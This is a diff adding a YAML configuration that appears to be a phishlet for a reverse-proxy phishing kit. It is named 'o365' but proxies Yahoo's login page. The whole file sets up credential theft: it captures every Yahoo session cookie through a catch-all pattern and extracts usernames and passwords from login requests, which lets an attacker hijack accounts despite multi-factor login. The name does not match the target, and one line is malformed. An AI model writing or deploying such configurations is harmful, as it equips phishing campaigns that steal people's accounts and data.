@@ -1,0 +1,23 @@
+name: 'o365'
+author: '@NOIR'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: false, is_landing:true }
+
+sub_filters: []
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: '(login|Username|email|username)'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: '(passwd|Password|password)'
+    search: '(.*)'
+    type: 'json'
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
